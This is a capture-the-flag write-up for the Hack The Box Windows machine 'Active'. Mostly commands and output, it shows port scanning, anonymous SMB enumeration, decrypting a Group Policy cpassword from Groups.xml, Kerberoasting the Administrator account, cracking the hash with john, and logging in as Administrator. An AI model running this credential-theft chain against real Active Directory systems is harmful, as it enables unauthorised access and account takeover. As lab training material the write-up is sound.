# Machine Name: Active  
# Machine Ip: 10.129.26.196  
# Type: Windows  
# Difficulity: Easy  

First of all, as usual I made a port scan to see which ports are open, then I looked through their versions by this command:  
```bash
┌──(faridd㉿Ferid)-[~/Downloads/active]
└─$ rustscan -a 10.129.26.196 -- -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/faridd/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.26.196:53
Open 10.129.26.196:88
Open 10.129.26.196:135
Open 10.129.26.196:139
Open 10.129.26.196:389
Open 10.129.26.196:445
Open 10.129.26.196:464
Open 10.129.26.196:593
Open 10.129.26.196:636
Open 10.129.26.196:3269
Open 10.129.26.196:3268
Open 10.129.26.196:5722
Open 10.129.26.196:9389
Open 10.129.26.196:49152
Open 10.129.26.196:49153
Open 10.129.26.196:49154
Open 10.129.26.196:49157
Open 10.129.26.196:49158
Open 10.129.26.196:49155
Open 10.129.26.196:49165
Open 10.129.26.196:49171
Open 10.129.26.196:49173
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sC -sV" on ip 10.129.26.196
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-29 23:26 +0400
NSE: Loaded 158 scripts for scanning.

Initiating SYN Stealth Scan at 23:26
Scanning 10.129.26.196 [22 ports]
Discovered open port 139/tcp on 10.129.26.196
Discovered open port 135/tcp on 10.129.26.196
Discovered open port 49152/tcp on 10.129.26.196
Discovered open port 445/tcp on 10.129.26.196
Discovered open port 3268/tcp on 10.129.26.196
Discovered open port 53/tcp on 10.129.26.196
Discovered open port 49173/tcp on 10.129.26.196
Discovered open port 593/tcp on 10.129.26.196
Discovered open port 49165/tcp on 10.129.26.196
Discovered open port 49158/tcp on 10.129.26.196
Discovered open port 3269/tcp on 10.129.26.196
Discovered open port 9389/tcp on 10.129.26.196
Discovered open port 49155/tcp on 10.129.26.196
Discovered open port 464/tcp on 10.129.26.196
Discovered open port 49171/tcp on 10.129.26.196
Discovered open port 389/tcp on 10.129.26.196
Discovered open port 49153/tcp on 10.129.26.196
Discovered open port 5722/tcp on 10.129.26.196
Discovered open port 49157/tcp on 10.129.26.196
Discovered open port 49154/tcp on 10.129.26.196
Discovered open port 88/tcp on 10.129.26.196
Discovered open port 636/tcp on 10.129.26.196

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-04-29 19:26:11Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5722/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49165/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49171/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49173/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-04-29T19:27:08
|_  start_date: 2026-04-29T19:23:39
|_clock-skew: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 58717/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 54296/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 7214/udp): CLEAN (Failed to receive data)
|   Check 4 (port 36893/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

```
I checked **anonymous rpc** connection but it failed:  
```bash
┌──(faridd㉿Ferid)-[~/Downloads/active]
└─$ rpcclient -U "" 10.129.26.196 -N
rpcclient $> enumdomusers
do_cmd: Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> 
```
So, let's try **smbclient**:  
```bash
┌──(faridd㉿Ferid)-[~/Downloads/active]
└─$ smbclient -L //10.129.26.196/ -N                 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.26.196 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
I didn't have access to **Users** folder but in **Replication** share, I found several folders and files. If you want to analyse the files faster and effectively, you can activate **"recursive" mode** and search them in this way.  
```bash
smb: \active.htb\> recurse ON
smb: \active.htb\> ls
```
It will show us several files in the subdirectories.   
```bash
GPT.INI
GPE.INI
Registry.pol
Groups.xml
GptTmpl.inf
GPT.INI
GptTmpl.inf
```
There are the found files.   
**GPT.INI, GPE.INI** - They are default file and useless most time.   
**GptTmpl.inf, Registry.pol** - They can be useful sometimes. First one shows which privileges the user have, password policy and other information. The second one stores registry configurations. Sometimes we can see specific configurations that were applied by the system.       
**Groups.xml** - This is your main target on this machine. In older Windows systems, when administrators set a new user or password via Group Policy, that information is stored in this XML file, specifically encrypted within the **cpassword** section. Since Microsoft officially released this **encryption key (AES) in 2012**, it can be easily decrypted using the **gpp-decrypt** tool.     

So let's download it into our kali.   
```bash
┌──(faridd㉿Ferid)-[~/Downloads/active]
└─$ smbclient //10.129.26.196/Replication -N
smb: \> cd active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml 
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> exit
```
```bash
┌──(faridd㉿Ferid)-[~/Downloads/active]
└─$ cat Groups.xml    
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
As you can see we got credentials from there. The **"username" = "SVC_TGS"** and the **"cpassword" is "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"**. We can easily decrypt this password by the help of **gpp-decrypt tool**.    
```bash
┌──(faridd㉿Ferid)-[~/Downloads/active]
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```
Yeahh, we already have username and password. Now, we can check it on smbclient to see the content of other shares.   
```bash
┌──(faridd㉿Ferid)-[~/Downloads/active]
└─$ smbclient -L //10.129.26.196/ -U "SVC_TGS%GPPstillStandingStrong2k18"

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.26.196 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                                                              
┌──(faridd㉿Ferid)-[~/Downloads/active]
└─$ smbclient //10.129.26.196/Users -U "SVC_TGS%GPPstillStandingStrong2k18" 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 18:39:20 2018
  ..                                 DR        0  Sat Jul 21 18:39:20 2018
  Administrator                       D        0  Mon Jul 16 14:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 10:06:44 2009
  Default                           DHR        0  Tue Jul 14 11:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 10:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 09:57:55 2009
  Public                             DR        0  Tue Jul 14 09:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 19:16:32 2018

		5217023 blocks of size 4096. 277689 blocks available
smb: \> 
```
We can get the **user.txt** file from the **/Svc_TGS/Desktop** folder. Which folders will not help us anyway?   
**All Users** - It is D(directory) + H(hidden) + S(system) + r(read-only) + n(Not Content Indexed). It means it is system protected hidden files and there is nothing for a user to do. So, do not waste your time by checking DHSrn permission folders.     
**Default / Default User** - They are Default folders and do not store useful information for a hacker.   
**desktop.ini** - This is just a configuration file that tells Windows how to set the folder's icon or appearance. It doesn't contain any interesting information.    
**Public** - is open for everyone, sometimes it can store confidential data but in this CTF we will look at SVC_TGS folder at first. In this way we got the user flag.     

----
# Privilege Escalation   
The username is **SVC_TGS**. This name is often assigned to service accounts that are associated with a **Service Principal Name (SPN)**. In Windows, such accounts are vulnerable to **Kerberosing** attacks.       
Logic: We will request a ticket **(TGS Ticket)** from Kerberos for this service. The ticket we receive will be hashed with the user's password. We can crack that hash offline to obtain the **Administrator** (or other high-level) password.     

Just run this command on your kali:   
```bash
┌──(faridd㉿Ferid)-[~/Downloads/active]
└─$ impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.26.196 -request
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 23:06:40.351723  2026-04-29 23:24:50.240565             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$914421f922acf74295fcaf4a95c30120$4ecd1419c50e5e2e5e4c1e67819a3e19ab81b5c93559f6429689bc3b6c8998ffa023e8e9e92a7f9c0d0b66c784a17eab9be52a584cea27962eb537b6020633b26fc68dbf56c539657d78fb79bd0ca7d6ce1c7090516270887edb7729b75b329a41515b9fff5678ac48aa7ef6e3338b863f516761bac1a651cac8c34950de0e6009ad27019bc328bf2ed31a6ab44923c9f5c8a0b1eea59d1d7466694864ad845b6c8413d1d0de3eac29377d3ae778fcb4fd8108732e93a4aa435a71e289a14c7ab8611b3161f7b4b39e2f14f86eb3bb70995ea1f68dc56f812ae327558ed633d4ca6d671614093e435aab3b2ca7ce7b298504495ad4838c0b79516d789c9c65d5dcff9e0090b5b9f8874f8c7175dd597f43737bb2bc5d3b03207df09ec46576d35e50ace7720765340f790c63b0d63481b575a9e21c09ca843ce9fbb1cc48de28cb251ca502edb99df2263d9e96026521a8236a66cf8ae2325912462cbb61295f3504d37b7851ff5e638a8cce16bdadb196ef895d230774e77011b08fe52bf224c2895e96e63b700e5e0e94a62875bb05b92778c4ad4c657a8f05b771acf5f15dcf5780bdb151accfc15f9621f9c4151913e3aa4d665a1b73147c826eb3d336294145e81a62ec55dc720fa7d6c3ec8bd51858020664a8ef60f6211002d21ab6e02ddb5724c114ff29363824319c280ad44452849bd02f21db9c50eacd896707567ebec1e74b53ad430ae7a3b259b854ab2c410ef0e7e309ba14cb2ecf3b0052499d65d03e0f71fc2b037cd9ba9a3aab81dacc073771efec7844073afe2294368d4af9261ad8b321079607c626873184291d61083179b9c6c4672cac0ceadba2dbc7ee6b80d638d904ffb99c9219cde43f011023bf67063d7cf411dbf974b0b4ba7951ba82eac36c226b67d716645497f9c76b0938c0e72a523cf343e2c1987a2461049c15260e5b66d6b04e66b468e1bc38b43986fee35fd7005ce7eb231b078cc707ad93355311d3c826735e7f24d4986af94144d1eb1ea178f91887ce7b94d77a0d7968a71683d7fbbeabb78b65f08557d2c502365db9e81f36de4aa0525011d4c5d1cf83fdb97075d976d504d85205859248d9a42adb5fc9716686b09896797ace9058ded789cd756c29391558ed54706cd59fdb027a91de4c72492dc6a72079816567a90f89ac873d4789c0bd722d4f2d883ffc89b8c52e5c2128db114d4081eac9dc809107be6acddf0658fc5f94717e40918c77f2d022a9

```
Let's decrypt it:   
```bash
┌──(faridd㉿Ferid)-[~/Downloads/active]
└─$ echo '$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$914421f922acf74295fcaf4a95c30120$4ecd1419c50e5e2e5e4c1e67819a3e19ab81b5c93559f6429689bc3b6c8998ffa023e8e9e92a7f9c0d0b66c784a17eab9be52a584cea27962eb537b6020633b26fc68dbf56c539657d78fb79bd0ca7d6ce1c7090516270887edb7729b75b329a41515b9fff5678ac48aa7ef6e3338b863f516761bac1a651cac8c34950de0e6009ad27019bc328bf2ed31a6ab44923c9f5c8a0b1eea59d1d7466694864ad845b6c8413d1d0de3eac29377d3ae778fcb4fd8108732e93a4aa435a71e289a14c7ab8611b3161f7b4b39e2f14f86eb3bb70995ea1f68dc56f812ae327558ed633d4ca6d671614093e435aab3b2ca7ce7b298504495ad4838c0b79516d789c9c65d5dcff9e0090b5b9f8874f8c7175dd597f43737bb2bc5d3b03207df09ec46576d35e50ace7720765340f790c63b0d63481b575a9e21c09ca843ce9fbb1cc48de28cb251ca502edb99df2263d9e96026521a8236a66cf8ae2325912462cbb61295f3504d37b7851ff5e638a8cce16bdadb196ef895d230774e77011b08fe52bf224c2895e96e63b700e5e0e94a62875bb05b92778c4ad4c657a8f05b771acf5f15dcf5780bdb151accfc15f9621f9c4151913e3aa4d665a1b73147c826eb3d336294145e81a62ec55dc720fa7d6c3ec8bd51858020664a8ef60f6211002d21ab6e02ddb5724c114ff29363824319c280ad44452849bd02f21db9c50eacd896707567ebec1e74b53ad430ae7a3b259b854ab2c410ef0e7e309ba14cb2ecf3b0052499d65d03e0f71fc2b037cd9ba9a3aab81dacc073771efec7844073afe2294368d4af9261ad8b321079607c626873184291d61083179b9c6c4672cac0ceadba2dbc7ee6b80d638d904ffb99c9219cde43f011023bf67063d7cf411dbf974b0b4ba7951ba82eac36c226b67d716645497f9c76b0938c0e72a523cf343e2c1987a2461049c15260e5b66d6b04e66b468e1bc38b43986fee35fd7005ce7eb231b078cc707ad93355311d3c826735e7f24d4986af94144d1eb1ea178f91887ce7b94d77a0d7968a71683d7fbbeabb78b65f08557d2c502365db9e81f36de4aa0525011d4c5d1cf83fdb97075d976d504d85205859248d9a42adb5fc9716686b09896797ace9058ded789cd756c29391558ed54706cd59fdb027a91de4c72492dc6a72079816567a90f89ac873d4789c0bd722d4f2d883ffc89b8c52e5c2128db114d4081eac9dc809107be6acddf0658fc5f94717e40918c77f2d022a9' > hash.txt
                                                                                                                                                                                              
┌──(faridd㉿Ferid)-[~/Downloads/active]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 24 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:01 DONE (2026-04-30 00:06) 0.7633g/s 8048Kp/s 8048Kc/s 8048KC/s Tiffani1432..Teacher21
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
Now, we have the password of Administrator. We can connect to smb via these credentials and get the root flag form the Desktop directory of the user Administrator.   
```bash
┌──(faridd㉿Ferid)-[~/Downloads/active]
└─$ smbclient //10.129.26.196/Users -U "Administrator%Ticketmaster1968"
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 18:39:20 2018
  ..                                 DR        0  Sat Jul 21 18:39:20 2018
  Administrator                       D        0  Mon Jul 16 14:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 10:06:44 2009
  Default                           DHR        0  Tue Jul 14 11:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 10:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 09:57:55 2009
  Public                             DR        0  Tue Jul 14 09:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 19:16:32 2018

		5217023 blocks of size 4096. 278949 blocks available
smb: \> cd Administrator\
smb: \Administrator\> cd Desktop\
smb: \Administrator\Desktop\> ls
  .                                  DR        0  Thu Jan 21 20:49:47 2021
  ..                                 DR        0  Thu Jan 21 20:49:47 2021
  desktop.ini                       AHS      282  Mon Jul 30 17:50:10 2018
  root.txt                           AR       34  Wed Apr 29 23:24:48 2026

		5217023 blocks of size 4096. 278949 blocks available
smb: \Administrator\Desktop\> 
```












